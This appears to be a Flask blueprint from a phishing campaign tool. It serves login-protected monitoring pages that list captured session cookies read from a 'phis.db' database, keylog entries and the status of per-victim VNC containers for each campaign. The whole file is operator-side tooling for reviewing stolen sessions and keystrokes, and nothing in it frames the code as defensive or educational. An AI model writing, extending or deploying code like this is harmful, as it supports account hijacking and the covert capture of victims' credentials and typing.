import sqlite3
import os

from flask import Blueprint, render_template, current_app
from flask_login import login_required

from ..models import db, Campaign, CampaignUser, Keylog, CollectionLog

monitoring_bp = Blueprint("monitoring", __name__)


@monitoring_bp.route("/monitoring/sessions/<int:campaign_id>")
@login_required
def sessions(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    cookies_data = _get_cookies(current_app.config["OUTPUT_DIR"], source="session", campaign_id=campaign_id)
    return render_template("monitoring/sessions.html", campaign=campaign, cookies=cookies_data)


@monitoring_bp.route("/monitoring/keylogs/<int:campaign_id>")
@login_required
def keylogs(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    keylog_entries = Keylog.query.filter_by(campaign_id=campaign_id).all()
    return render_template("monitoring/keylogs.html", campaign=campaign, keylogs=keylog_entries)


@monitoring_bp.route("/monitoring/containers/<int:campaign_id>")
@login_required
def containers(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    users = CampaignUser.query.filter_by(campaign_id=campaign_id).all()
    from .. import docker_manager
    statuses = {}
    for u in users:
        statuses[u.vnc_container] = docker_manager.get_container_status(u.vnc_container)
        statuses[u.mvnc_container] = docker_manager.get_container_status(u.mvnc_container)
    return render_template("monitoring/containers.html", campaign=campaign, users=users, statuses=statuses)


def _get_cookies(output_dir, source=None, campaign_id=None):
    """Read cookies from phis.db (the existing cookie database), filtered by campaign."""
    db_path = os.path.join(output_dir, "phis.db")
    if not os.path.exists(db_path):
        return []
    try:
        conn = sqlite3.connect(db_path)
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        
        # Build query with filters
        query = "SELECT * FROM cookies"
        params = []
        
        if campaign_id:
            # Filter by campaign - get containers for this campaign
            from ..models import CampaignUser
            campaign_users = CampaignUser.query.filter_by(campaign_id=campaign_id).all()
            if campaign_users:
                # Get all container names for this campaign
                containers = []
                for cu in campaign_users:
                    if cu.vnc_container:
                        containers.append(cu.vnc_container)
                    if cu.mvnc_container:
                        containers.append(cu.mvnc_container)
                
                if containers:
                    placeholders = ','.join(['?' for _ in containers])
                    query += f" WHERE phis IN ({placeholders})"
                    params.extend(containers)
        
        if source:
            if "WHERE" in query:
                query += " AND source = ?"
            else:
                query += " WHERE source = ?"
            params.append(source)
        
        query += " ORDER BY id DESC"
        
        c.execute(query, params)
        rows = [dict(r) for r in c.fetchall()]
        conn.close()
        return rows
    except Exception:
        return []
